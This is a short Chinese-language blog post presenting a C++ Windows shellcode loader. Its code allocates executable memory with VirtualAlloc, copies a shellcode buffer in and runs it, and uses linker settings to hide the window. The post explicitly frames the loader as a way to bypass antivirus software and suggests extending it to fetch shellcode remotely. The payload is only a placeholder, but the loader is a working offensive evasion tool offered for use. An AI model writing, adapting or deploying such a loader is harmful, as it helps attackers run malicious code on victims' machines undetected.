---
title: "C++ ShellCode 加载器"
date: 2019-08-05T00:00:00+08:00
draft: false
author: "X1r0z"

tags: ['shellcode','c++','bypass']
categories: ['bypass']

hiddenFromHomePage: false
hiddenFromSearch: false
twemoji: false
lightgallery: true
ruby: true
fraction: true
fontawesome: true
linkToMarkdown: true
rssFullText: false

toc:
  enable: true
  auto: true
code:
  copy: true
  maxShownLines: 50
math:
  enable: false
share:
  enable: true
comment:
  enable: true
---


通过 Win32 API 实现从内存中加载 ShellCode.

<!--more-->

之前也用过 Python Go 方式的 ShellCode 执行器, 不过使用 C++ 编译的文件体积会小很多.

```
#include <Windows.h>

#pragma comment(linker,"/subsystem:\"windows\" /entry:\"Run\"")  
#pragma comment(linker, "/INCREMENTAL:NO")   

unsigned char buf[] = "shellcode";


int Run()
{
	LPVOID Memory = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memcpy(Memory, buf, sizeof(buf));
	((void(*)())Memory)();
	return 0;
}
```

两行预编译代码用来隐藏窗口和自定义入口点, 实测把 main 改掉以后体积缩小了一大半.

Windows 10 1903 下使用 Visual Studio 2019 编译后大小为 4kb.

至于 ShellCode 加载器, 已经给出了上面的代码, 拓展一下写出一个简单的 loader 也并不困难, 无非就是本地读取和远程读取两种方式. 而且使用自己写的工具而不是网上被大量使用的 shellcode launcher, 会更容易地绕过杀软.

[cpploader](https://github.com/X1r0z/cpploader)